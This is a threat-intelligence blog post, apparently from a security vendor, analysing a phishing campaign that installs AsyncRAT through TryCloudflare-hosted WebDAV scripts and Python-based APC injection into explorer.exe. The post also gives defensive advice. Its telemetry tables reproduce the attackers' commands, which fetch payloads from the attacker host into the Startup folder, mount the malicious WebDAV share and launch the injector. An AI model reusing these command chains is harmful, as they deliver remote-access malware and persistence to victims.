# Analyzing a a Multi-Stage AsyncRAT Campaign via Managed Detection and Response

- **Source :** trendmicro
- **URL :** https://www.trendmicro.com/en/research/26/a/analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html
- **Date :** 2026-01-12

---

Malware

# Analyzing a Multi-Stage AsyncRAT Campaign via Managed Detection and Response

Threat actors exploited Cloudflare's free-tier infrastructure and legitimate Python environments to deploy the AsyncRAT remote access trojan, demonstrating advanced evasion techniques that abuse trusted cloud services for malicious operations.

By: Buddy Tancio, Jed Valderama, Khristoffer Jocson, Franklynn Uy 2026/01/12 Read time:  ( words) 

[ ![Share](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg) ](https://www.addtoany.com/share) ![Print](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg)

Save to Folio

__

* * *

### Overview

  * Introduction



  * AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery.
  * The attack uses legitimate Python downloads from official sources, establishing a complete Python environment on victim systems to execute sophisticated code injection techniques targeting _explorer.exe_ processes.
  * The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (_.pdf.url_) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion.
  * The malware ensures persistence through multiple vectors including startup folder scripts (_ahke.bat_ , _olsm.bat_), WebDAV mounting, and legitimate "living-off-the-land" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection.
  * TrendAI Vision One™ detects and blocks the indicators of compromise (IOCs) outlined in this blog, and provides customers with tailored threat hunting queries, threat insights, and intelligence reports.



# Introduction

[AsyncRAT](/en/research/23/l/analyzing-asyncrat-code-injection-into-aspnetcompiler-exe.html) has emerged as a notable Remote Access Trojan (RAT) used by threat actors for its robust capabilities and ease of deployment. It gained favor for its extensive feature set, which includes keylogging, screen capturing, and remote command execution capabilities. Its modular architecture, typically implemented in Python, provides flexibility and ease of customization, making it a preferred tool of choice for cybercriminals.

During our investigation of AsyncRAT infections, we observed Python scripts playing a central role in the infection chain, automating various stages of the attack. The initial payload, a Windows Script Host (_WSH_) file, was designed to download and execute additional malicious scripts hosted on a WebDAV server. These scripts facilitated the download of batch files and further payloads, ensuring a seamless and persistent infection routine.

The attackers cleverly exploited Cloudflare's free-tier services to host their WebDAV server, abusing the platform's reliability and widespread trust to evade detection. By using Cloudflare's infrastructure, the threat actors masked the malicious activity under legitimate domains, making it challenging for traditional security solutions to identify and block the threat.

Similar behavior was [documented](https://www.forcepoint.com/blog/x-labs/asyncrat-reloaded-python-trycloudflare-malware) before by other researchers. However, since then there have been changes in the behavior of the scripts, as well as differing main payloads.

This entry dissects the attack chain from initial compromise through AsyncRAT deployment, examining the attacker's techniques for system infiltration and persistent access.

# Threat map

Figure 1 illustrates the observed behavior of the threat across the cases we investigated. During the initial stages of the attack, users received a phishing email containing a Dropbox link leading to an Internet Shortcut file(_.url_). When opened, the file redirects users to download multi-stage scripts hosted on TryCloudflare domains. These scripts then install a Python environment, establish persistence via startup folder scripts, and inject code into _explorer.exe_. The final payload (_new.bin_) was identified to be AsyncRAT.

[ ![Figure 1. Our observed AsyncRAT infection chain which was correlated using Trend Vision One™](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig1.png) ](/content/dam/trendmicro/global/en/research/26/a/fig1.png)

Figure 1. Our observed AsyncRAT infection chain which was correlated using Trend Vision One™

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig1.png)

**Managed Detection and Response (MDR) investigation and analysis**

## Initial Access

Our investigation indicated that the user was likely compromised via a phishing attack. The image below shows the presence of _Outlook.exe_ , suggesting that the attack involved directing the user to download a malicious archive file named _Rechnung zu Auftrag W19248960825.pdf.zip_(translating to “Invoice for Order” in German). In all the cases we observed, the file name "_Rechnung_ " (German word for invoice, bill or check) remained consistent, followed by additional characters. 

[ ![Figure 2. Outlook.exe and downloading “Rechnung zu Auftrag W19248960825.pdf.zip” from a Dropbox URL.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig2.png) ](/content/dam/trendmicro/global/en/research/26/a/fig2.png)

Figure 2. Outlook.exe and downloading “Rechnung zu Auftrag W19248960825.pdf.zip” from a Dropbox URL.

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig2.png)

Our telemetry also showed that the user downloaded the _Rechnung zu Auftrag W19248960825.pdf.zip_ via msedge.

eventSubId: 603 - TELEMETRY_INTERNET_DOWNLOAD  
objectFilePath: C:\Users\<username>\AppData\Local\Temp\MicrosoftEdgeDownloads\6afacba0-f0d1-4b8b-85c7-5bfc8784b9c5\Rechnung zu Auftrag W19248960825.pdf.zip  
parentFilePath: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exerequest: hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/50mvsqpvyxid7m39g773l/Rechnung-zu-Auftrag-W19248960825.pdf.zip?rlkey=rtgatrazvz9rbqtxbj9rtf7os&st=t318uel6&dl=0

## Execution

The downloaded ZIP file contains the _Rechnung-zu-Auftrag-W19248960825.pdf.url_ Internet Shortcut file, which links to a WebDAV resource hosted on various servers within Cloudflare's free-tier service with URLs containing _trycloudflare[.]com_ in their names. These URLs point to a Windows Script Host file (_as.wsh_) located in the _DavWWWRoot_ directory. The specific URLs used in these shortcut files may vary, but they all employ the _trycloudflare[.]com_ domain to obfuscate their true intent.

The following are a list of URLs from the shortcut files in the cases we investigated. Note that these URLs are designed to evade detection and facilitate the download and execution of malicious scripts hosted on Cloudflare's free-tier service remote servers.

  * _plus-condos-thy-redeem.trycloudflare[.]com_
  * For this blog entry, we will focus on our investigation of this particular URL. However, regardless of the URL, they all behave the same.
  * _owners-insertion-rentals-pursuit.trycloudflare[.]com_
  * Initially accesses 87[.]106[.]191[.]217 via port 5380, then redirects to this site.
  * _strength-blind-bristol-ten.trycloudflare[.]com_
  * _syracuse-seeks-wilson-row.trycloudflare[.]com_
  * _citysearch-packed-bacterial-receptors.trycloudflare[.]com_



[ ![Figure 3. Snippet from the shortcut file “Rechnung zu Auftrag.pdf.url”](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig3.png) ](/content/dam/trendmicro/global/en/research/26/a/fig3.png)

Figure 3. Snippet from the shortcut file “Rechnung zu Auftrag.pdf.url”

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig3.png)

[ ![Figure 4. Connection to plus-condos-thy-redeem.trycloudflare\[.\]com \(104\[.\]16\[.\]230\[.\]132:443\)](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig4.png) ](/content/dam/trendmicro/global/en/research/26/a/fig4.png)

Figure 4. Connection to plus-condos-thy-redeem.trycloudflare[.]com (104[.]16[.]230[.]132:443)

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig4.png)

Next, the _svchost.exe_ process initiates the WebClient service to enable interaction with WebDAV servers. Meanwhile, _rundll32.exe_ executes the _DavSetCookie_ function from _davclnt.dll_ with parameters specifying a WebDAV server (_plus-condos-thy-redeem.trycloudflare[.]com_) and an SSL connection. This is for downloading additional files from the remote server.

processFilePath: C:\Windows\System32\svchost.exe  
processCmd: C:\WINDOWS\system32\svchost.exe -k LocalService -p -s WebClient  
eventSubId: 2 - TELEMETRY_PROCESS_CREATE  
objectFilePath: C:\Windows\System32\rundll32.exe  
objectCmd: rundll32.exe C:\WINDOWS\system32\davclnt.dll,DavSetCookie plus-condos-thy-redeem.trycloudflare[.]com@SSL https://plus-condos-thy-redeem.trycloudflare[.]com/

The initial stage of the threat installation employs either Windows Script files (_.wsf_ and _.wsh)_ or batch files (_.bat_). The file names vary, but the overall routine stays constant. In most of the cases that we investigated, the first file that was downloaded and executed was __as.wsh__ which, in turn, downloads and executes _anc.wsf_.

processFilePath: C:\Windows\explorer.exe  
processCmd: C:\WINDOWS\Explorer.EXE  
eventSubId: 2 - TELEMETRY_PROCESS_CREATE  
objectFilePath: C:\Windows\System32\wscript.exe  
objectCmd: "C:\WINDOWS\System32\WScript.exe" "\\\plus-condos-thy-redeem.trycloudflare[.]com@SSL\DavWWWRoot\as.wsh"

[ ![Figure 5. The contents of the Windows script file “as.wsh”](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig5.png) ](/content/dam/trendmicro/global/en/research/26/a/fig5.png)

Figure 5. The contents of the Windows script file “as.wsh”

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig5.png)

[ ![Figure 6. The “as.wsh” file downloaded and executed several files](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig6.png) ](/content/dam/trendmicro/global/en/research/26/a/fig6.png)

Figure 6. The “as.wsh” file downloaded and executed several files

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig6.png)

The downloaded file _\\\plus-condos-thy-redeem.trycloudflare[.]com\DavWWWRoot\anc.wsf_ was subsequently executed. Our telemetry shows that it ran the following command, mirroring the execution method we observed for _as.wsh_ :

  * rundll32.exe C:\WINDOWS\system32\davclnt.dll,DavSetCookie plus-condos-thy-redeem.trycloudflare[.]com http://plus-condos-thy-redeem.trycloudflare[.]com/anc.wsf



**AMSI Telemetry** | **Description**  
---|---  
IWshShell3.ExpandEnvironmentStrings("%TEMP%"); | Expands the %TEMP% environment variable to get the path of the temporary directory.  
IFileSystem3.CopyFile("\\\plus-condos-thy-redeem.trycloudflare[.]com@SSL\DavWWWRoot\vio.bat", "C:\Users\<USERNAME>\AppData\Local\Temp\vio.bat", "true"); | Copies vio.bat from the WebDAV server to the local temporary directory.  
IFileSystem3.CopyFile("\\\plus-condos-thy-redeem.trycloudflare[.]com@SSL\DavWWWRoot\xeno.bat", "C:\Users\<USERNAME>\AppData\Local\Temp\xeno.bat", "true"); | Copies xeno.bat from the WebDAV server to the local temporary directory.  
IWshShell3.Run("C:\Users\<USERNAME>\AppData\Local\Temp\vio.bat", "0", "true"); | Executes vio.bat from the local temporary directory without displaying a window (hidden).  
IHost.Sleep("3000"); | Introduces a 3-second delay.  
IWshShell3.Run("cmd /c start /MIN "C:\Users\<USERNAME>\AppData\Local\Temp\xeno.bat"", "0", "false"); | Executes xeno.bat with a minimized window using cmd /c start /MIN.  
IHost.Sleep("1000"); | Introduces a 1-second delay.  
IWshShell3.Run("C:\Users\<USERNAME>\AppData\Local\Temp\xeno.bat", "2", "false"); | Executes xeno.bat with a normal window.  
  
Table 1. Trend Micro Antimalware Scan Interface (AMSI) telemetry generated by the file “anc.wsf”

In summary, _anc.wsf_ performs the following:

  * Downloads  _vio.bat_ and  _xeno.bat_ from the WebDAV server to the local temporary directory.
  * Executes  _vio.bat_ silently multiple times.
  * Executes  _xeno.bat_ in both minimal and normal window modes after certain intervals.



The _Vio.bat_ file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at  _C:\Users\ <username>\AppData\Local\Temp\p.zip_.

processFilePath: C:\Windows\System32\cmd.exe  
processCmd: C:\WINDOWS\system32\cmd.exe /c ""C:\Users\<USERNAME>\AppData\Local\Temp\vio.bat" h "  
eventSubId: 2 - TELEMETRY_PROCESS_CREATE  
objectFilePath: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  
objectCmd: powershell -Command "iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\Users\<USERNAME>\AppData\Local\Temp\p.zip'"

[ ![Figure 7. The Python archive was downloaded and stored in the temporary folder as “p.zip” ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig7.png) ](/content/dam/trendmicro/global/en/research/26/a/fig7.png)

Figure 7. The Python archive was downloaded and stored in the temporary folder as “p.zip” 

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig7.png)

The other downloaded batch file (_xeno.bat_) has near-identical functions to _vio.bat_. However, unlike the previous behavior, it opens a legitimate PDF document to deceive the victim into believing a normal PDF file was accessed.

processFilePath: C:\Windows\System32\cmd.exe  
processCmd: C:\WINDOWS\system32\cmd.exe /c ""C:\Users\<USERNAME>\AppData\Local\Temp\xeno.bat" "  
eventSubId: 2 - TELEMETRY_PROCESS_CREATE  
objectFilePath: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe  
objectCmd: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --single-argument https://www.ihk.de/blueprint/servlet/resource/blob/5581278/1cafa7f203df9d83e050d9f01677ffe6/rechnung-kleinunternehmer-data.pdf

[ ![Figure 8. A legitimate PDF file is opened to mislead the user into believing a genuine document has been accessed](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig8.png) ](/content/dam/trendmicro/global/en/research/26/a/fig8.png)

Figure 8. A legitimate PDF file is opened to mislead the user into believing a genuine document has been accessed

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig8.png)

This batch file (_xeno.bat_) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder. The downloaded file, in this specific case, is an embedded version of Python 3.14.0 for 64-bit Windows systems, which is saved as _p.zip_.  
processFilePath: C:\Windows\System32\cmd.exe  
processCmd: C:\WINDOWS\system32\cmd.exe /c ""C:\Users\<USERNAME>\AppData\Local\Temp\xeno.bat" h "  
eventSubId: 2 - TELEMETRY_PROCESS_CREATE  
objectFilePath: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  
objectCmd: powershell -Command "iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\Users\<USERNAME>\AppData\Local\Temp\p.zip'"

The archive _p.zip_ was then extracted using the PowerShell command _Expand-Archive_ to _C:\Users\ <USERNAME>\AppData\Local\z1man_.

[ ![Figure 9. The contents of “p.zip” \(Python Library\) were extracted to C:\\Users\\<USERNAME>\\AppData\\Local\\z1man](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig9.png) ](/content/dam/trendmicro/global/en/research/26/a/fig9.png)

Figure 9. The contents of “p.zip” (Python Library) were extracted to C:\Users\<USERNAME>\AppData\Local\z1man

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig9.png)

It then establishes persistence by dropping a batch file in the Startup folder; however, this time it downloads the files _ahke.bat_ and _olsm.bat_.  
powershell -Command "iwr 'https://plus-condos-thy-redeem.trycloudflare[.]com/ahke.bat' -OutFile 'C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ahke.bat'"  
powershell -Command "iwr 'https://plus-condos-thy-redeem.trycloudflare[.]com/olsm.bat' -OutFile 'C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\olsm.bat'

The following table summarizes the activities of the _vio.bat_ and _xeno.bat_ files.

**AMSI Telemetry** | **Description**  
---|---  
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --single-argument https://www.ihk.de/blueprint/servlet/resource/blob/5581278/1cafa7f203df9d83e050d9f01677ffe6/rechnung-kleinunternehmer-data.pdf | Downloads a legitimate PDF file to trick users (only present with xeno.bat).  
powershell -Command "iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\Users\<USERNAME>\AppData\Local\Temp\p.zip'" | Downloades Python 3.14.0 from the official website and saves it in the temporary folder as p.zip.  
powershell -Command "Expand-Archive 'C:\Users\<USERNAME>\AppData\Local\Temp\p.zip' 'C:\Users\<username>\AppData\Local\z1man' -Force" | Extracted p.zip (Python Archive) to the folder 'C:\Users\<user>\AppData\Local\z1man'  
powershell -Command "iwr 'https://plus-condos-thy-redeem.trycloudflare[.]com/ahke.bat' -OutFile 'C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ahke.bat'" | Downloads the ahke.bat file from the given URL and saves it to the Startup folder of the user <username>. Placing a file in the Startup folder ensures that it will be automatically executed when the user logs into Windows.  
powershell -Command "iwr 'https://plus-condos-thy-redeem.trycloudflare[.]com/olsm.bat' -OutFile 'C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\olsm.bat'" | Downloads the olsm.bat file from the given URL and saves it to the Startup folder of the user. Placing a file in the Startup folder ensures that it will be automatically executed when the user logs into Windows.  
powershell -Command "iwr 'https://plus-condos-thy-redeem.trycloudflare[.]com/ab/ne.py' -OutFile 'C:\Users\<username>\AppData\Local\z1man\ne.py'" | Downloads and executes the file C:\Users\<username>\AppData\Local\z1man\ne.py, ab/ne.py, ow/ne.py, and vb/ne.py from https://plus-condos-thy-redeem[.]trycloudflare[.]com  
powershell -Command "iwr 'https://plus-condos-thy-redeem.trycloudflare[.]com/ow/new.bin' -OutFile 'C:\Users\<username>\AppData\Local\z1man\new.bin'" | Downloads and executes the file C:\Users\<username>\AppData\Local\z1man\new.bin. This is the main payload.   
powershell -Command "iwr 'https://plus-condos-thy-redeem.trycloudflare[.]com/ab/a.txt' -OutFile 'C:\Users\<username>\AppData\Local\z1man\a.txt'" | Downloaded and executed the file C:\Users\<username>\AppData\Local\z1man\a.txt, ab/a.txt, ow/a.txt, and vb/a.txt from https://plus-condos-thy-redeem[.]trycloudflare[.]com  
python ne.py -i new.bin -k a.txt | Runs the ne.py script using new.bin as an input file and a.txt as another parameter, which contains a key to decrypt the obfuscated input binary file new.bin.  
  
Table 2. Summary of the vio.bat and xeno.bat files based on AMSI telemetry

We observed __python.exe__ being used to perform code injection into _explorer.exe_ via the command _python_ _ne.py new.bin -k a.txt_. Analysis revealed that _new.bin_ contains shellcode, which we identified as AsyncRAT.

[ ![Figure 10. Code Injection to explorer.exe](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig10.png) ](/content/dam/trendmicro/global/en/research/26/a/fig10.png)

Figure 10. Code Injection to explorer.exe

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig10.png)

Note that in some cases, Python was not downloaded from the official website, instead, the _net use_ command was used to mount the WebDAV server where the Python library was hosted. In the example below, it was mounted to the Q drive to facilitate the transfer.

objectCmd: net use Q: "\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\of" /persistent:no

The Python library was then extracted from the mounted Q drive to _C:\Users\ <USERNAME>\AppData\Local\Microsoft\SystemCache25_. This directory contains the complete Python library as well as the malicious shell, keys, and Python scripts.

xcopy "Q:\extracted\\*" "." /Y /I /S  
C:\Users\<username>\AppData\Local\Microsoft\SystemCache25\\_zstd.pyd

## File analysis

We successfully extracted all files from one of the active remote servers at _87[.]106[.]191[.]217:5380_ , which revealed the complete set of files used to install AsyncRAT. The remote server contained all the files that we observed using Trend Vision One™.

To further understand the capabilities of the threat, we analyzed all its components, which will be discussed in the next section.

[ ![Figure 11. 87\[.\]106\[.\]191\[.\]217 hosting the threat components. ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig11.png) ](/content/dam/trendmicro/global/en/research/26/a/fig11.png)

Figure 11. 87[.]106[.]191[.]217 hosting the threat components. 

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig11.png)

### Rechnung zu Auftrag W19248960825.pdf.url

  * This file poses as a PDF file using a double extension but is actually an internet shortcut file. This is the initial file that was distributed to the target machine. When executed, it runs a series of script components specified on its _TryCloudflare_ tunnel, beginning with _as.wsh._



[ ![Figure 12. Script in the internet shortcut file used in the initial access.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig12.png) ](/content/dam/trendmicro/global/en/research/26/a/fig12.png)

Figure 12. Script in the internet shortcut file used in the initial access.

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig12.png)

### as.wsh/ wa.wsh

  * A Windows Script Host control file that points to the next script to execute: _anc.wsf_



[ ![Figure 13. The as.wsh file pointing to a remote script](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig13.png) ](/content/dam/trendmicro/global/en/research/26/a/fig13.png)

Figure 13. The as.wsh file pointing to a remote script

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig13.png)

### anc.wsf

  * A Windows Script File that copies the batch files _vio.bat_ and _xeno.bat_ to a temporary folder and executes them.



[ ![Figure 14. The anc.wsf script downloads and executes xeno.bat and vio.bat.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig14.png) ](/content/dam/trendmicro/global/en/research/26/a/fig14.png)

Figure 14. The anc.wsf script downloads and executes xeno.bat and vio.bat.

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig14.png)

### vio.bat 

  * The _vio.bat_ file executes itself under a hidden PowerShell window, downloads Python 3.14.0 from the official site and extracts it into the _z1man_ folder. It installs a persistence mechanism by downloading an additional batch file, _olsm.bat_ , to the Startup folder. It then downloads three additional components for its Python execution and runs the script _ne.py_ with _new.bin_ and _a.txt_ as parameters.



[ ![Figure 15. The vio.bat file downloads the components, Python libraries, batch files for persistence, and main payloads.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig15.png) ](/content/dam/trendmicro/global/en/research/26/a/fig15.png)

Figure 15. The vio.bat file downloads the components, Python libraries, batch files for persistence, and main payloads.

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig15.png)

### xeno.bat

  * The _xeno.bat_ file performs the same routine as _vio.bat,_ but with a few key differences. First, it opens a legitimate PDF document to trick the victim into believing that a normal PDF file was opened. It follows the same Python installation routine, ensuring that Python is installed in the _z1man_ folder. It then establishes persistence in a similar manner by dropping a batch file in the Startup folder; however, this time it downloads the file _ahke.bat_. Finally, it executes the same python script _ne.py_ with _new.bin_ and _a.txt_ as parameters.



[ ![Figure 16. Xeno.bat downloads and opens a legitimate PDF file to deceive users while the main payload is installed in the background.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig16.png) ](/content/dam/trendmicro/global/en/research/26/a/fig16.png)

Figure 16. Xeno.bat downloads and opens a legitimate PDF file to deceive users while the main payload is installed in the background.

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig16.png)

### ahke.bat and olsm.bat

  * These batch files are installed as persistence mechanisms to ensure that the _ne.py_ script is executed on Startup with _new.bin_ and _a.txt_. Interestingly, the two batch files search for two different hardcoded folders. Specifically, _ahke.bat_ checks for the presence of the _z1man_ folder, whereas _olsm.bat_ searches for the _qo1man_ folder. Because _z1man_ is the installation directory for this instance, _olsm.bat_ would fail and generate errors.



[ ![Figure 17. Batch files installed in the Startup folder for persistence, running Python to execute AsyncRAT upon startup. ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig17.png) ](/content/dam/trendmicro/global/en/research/26/a/fig17.png)

Figure 17. Batch files installed in the Startup folder for persistence, running Python to execute AsyncRAT upon startup. 

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig17.png)

### ne.py

  * The ne.py Python script is used for Polymorphic Asynchronous Procedure Call (APC) Injection, which is a method of executing arbitrary code in the address space of a separate live process. This script takes on two parameters that have default values and two required parameters — in this instance, the input (_-i_) _new.bin_ and the key file (_-k_) _a.txt_. The target process for injection can be specificed via the _-p_ parameter, but defaults to injecting into the _explorer.exe_ process if no parameter is provided. Meanwhile, the _-c_ parameter refers to the shellcode's compression.



[ ![Figure 18. Obfuscated main function in ne.py handling argument parsing for a polymorphic APC injector.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig18.png) ](/content/dam/trendmicro/global/en/research/26/a/fig18.png)

Figure 18. Obfuscated main function in ne.py handling argument parsing for a polymorphic APC injector.

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig18.png)

### a.txt 

  * The _a.txt_ file contains keys used by _ne.py_ to decrypt the obfuscated input binary file _new.bin_.



### new.bin

  * The binary file _new.bin_ serves as the primary input to _ne.py_ , containing the main binary payload that is decrypted and injected into the target process (default: _explorer.exe_) via APC injection.
  * When unpacked, these _new.bin_ files were identified to be shellcode files created using [Donut](https://attack.mitre.org/software/S0695/), an open-source framework used to generate position-independent shellcode.
  * Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT.



[ ![Figure 19. The a.txt file contains the keys to decrypt the obfuscated binary file new.bin, identified as AsyncRAT.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig19.png) ](/content/dam/trendmicro/global/en/research/26/a/fig19.png)

Figure 19. The a.txt file contains the keys to decrypt the obfuscated binary file new.bin, identified as AsyncRAT.

[ download ](/content/dam/trendmicro/global/en/research/26/a/fig19.png)

### email_verify_20251110113314.txt

  * This is a list of emails that are possibly extracted from the affected system.



## Shared infrastructure for multiple attacks

The other files hosted on the TryCloudflare sites do not appear to be used for this specific case, though they may be employed in separate attack chains. Although the specific context of these files is unclear, their presence suggests that attackers may reuse a single __ TryCloudflare tunnel instance across multiple attacks until it is reported and taken down by Cloudflare.

### ile.gz\ab.lnk

  * A malformed shortcut file referencing _calc.exe_ through directory traversal _(..\\..\\..\%system%\calc.exe_); however hex analysis reveals references to _new.bat_ (C : \ U s e r s \ A d m i n i s t r a t o r \ D e s k t o p \ n e w . b a t).



### myfile.tar\new.html

  * A fake Captcha that instructs the user to copy commands and run it via the command line. Upon execution, it opens a dummy PDF hosted in GitHub designed to trick the user into believing that a normal document was accessed.****



### new.html

  * Another variant of the fake CAPTCHA that leads to the download of a JavaScript file masquerading as a PDF via a double file extension.
  * This Javascript file will run the TryCloudflare routine.
  * Finally, it redirects to a dropbox URL showing a 404 error even if the JS file was downloaded: hxxps://www.dropbox.com/scl/fi/b0hjyzf31f6aiwk0w94qo/RC-4583729_Oct22_2025_Statement[.]pdf-2.zip?rlkey=02txbrm2qhy58iiwnkzl94zal&st=6x08apya&dl=1



### we.html

  * This file contains a link to a GitHub account hosting _new.html_****



## Threat intelligence relationships

This graph shows the relationships between the WebDAV servers hosted on TryCloudflare:

  * _owners-insertion-rentals-pursuit.trycloudflare[.]com_
  * _plus-condos-thy-redeem.trycloudflare[.]com_.



Both servers host the same set of files. While minor variations result in differing file hashes, the overall file structure remains highly similar. Both URLs also retrieve a legitimate PDF file from the website _ihk[.]de_ and host the final payload, which performs code injection into _explorer.exe_ using Python, and ultimately loads the AsyncRAT shell.

[ ![Figure 20. This graph illustrates the relationships between the files that we investigated in different cases](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/a/fig20.png) ](/content/dam/trendmicro/global/en/research/26/a/fig20.png)

Figure 20. This graph illustrates the relationships between the files that we investigated in different cases

# Conclusion and security recommendations

The AsyncRAT campaign analyzed in this report demonstrates the increasing sophistication of threat actors in abusing legitimate services and open-source tools to evade detection and establish persistent remote access. By utilizing Python-based scripts and abusing Cloudflare’s free-tier infrastructure for hosting malicious payloads, the attackers successfully masked their activities under trusted domains, bypassing traditional security controls.

The infection chain began with a phishing email and a deceptive ZIP archive, ultimately leading to the download and execution of multiple batch and script files, the installation of a Python environment, and the deployment of an advanced code injection routine. The attackers’ use of living-off-the-land techniques, including the use of Windows Script Host and PowerShell, further complicates detection and response efforts. The campaign also employed social engineering tactics, including the display of legitimate PDF documents, to deceive victims and reduce suspicion.

This attack highlights the ongoing trend of abusing cloud tunneling and legitimate hosting services to deliver and execute malware. It underscores the need for organizations to adopt a multi-layered security approach and maintain vigilance against evolving tactics, techniques, and procedures (TTPs) employed by cybercriminals.

Here are some best security practices we recommend for defending against these attacks:

  * Regularly educate users about phishing tactics and the risks associated with opening unsolicited attachments or links, especially those with double extensions or from unknown sources.
  * Implement advanced email security solutions capable of detecting and blocking malicious attachments and URLs. Enable web filtering to restrict access to known malicious domains and newly registered or suspicious cloud-hosted resources.
  * Deploy endpoint detection and response (EDR) solutions with behavioral analysis to identify and block script-based attacks and code injection techniques. Ensure that all endpoints are configured to prevent the execution of scripts and batch files from user-writable directories, such as the Downloads or Temp folders.
  * Monitor and restrict outbound connections to cloud services that are not required for business operations, including free-tier tunneling and file hosting platforms. Implement network segmentation to limit lateral movement in case of compromise.
  * Maintain up-to-date operating systems and applications to reduce the attack surface for exploitation.
  * Audit and monitor the use of third-party cloud services within the organization. Consider restricting or blocking the use of unsanctioned cloud-based file sharing and tunneling services.
  * Monitor for unauthorized file creation in startup directories and the use of scheduled tasks or registry keys for persistence.



# **Proactive security with TrendAI Vision One™**

[TrendAI Vision One™](/en/business/products/one-platform.html) is the industry-leading AI cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection.

TrendAI Vision One™ Threat Intelligence Hub

[TrendAI Vision One™ Threat Intelligence Hub](https://www.trendmicro.com/en_us/business/products/threat-intelligence.html) provides the latest insights on emerging threats and threat actors, exclusive strategic reports from TrendAI™ Research, and TrendAI Vision One™ Threat Intelligence Feed in the TrendAI Vision One™ platform.

Emerging Threats

  * [Analyzing a Multi-Stage AsyncRAT Campaign via Managed Detection and Response](https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fportal.xdr.trendmicro.com%2Findex.html%23%2Fapp%2Fti%2Fintelligence_insights%3Fname%3DAnalyzing%2520a%2520Multi-Stage%2520AsyncRAT%2520Campaign%2520via%2520Managed%2520Detection%2520and%2520Response&data=05%7C02%7CRonaldo_Mangahas%40trendmicro.com%7Cbcdb9dfe41024d7dd26d08de4ea5c9bc%7C3e04753aae5b42d4a86dd6f05460f9e4%7C0%7C0%7C639034671127530368%7CUnknown%7CTWFpbGZsb3d8eyJFbXB0eU1hcGkiOnRydWUsIlYiOiIwLjAuMDAwMCIsIlAiOiJXaW4zMiIsIkFOIjoiTWFpbCIsIldUIjoyfQ%3D%3D%7C0%7C%7C%7C&sdata=R%2FR5%2Fhbn4r8Vf%2BwUwxd6pArfzZJJsuEFswu613ZmeOc%3D&reserved=0)
  * ****
  * **TrendAI Vision One™ Intelligence Reports (IOC Sweeping)**
  * ****
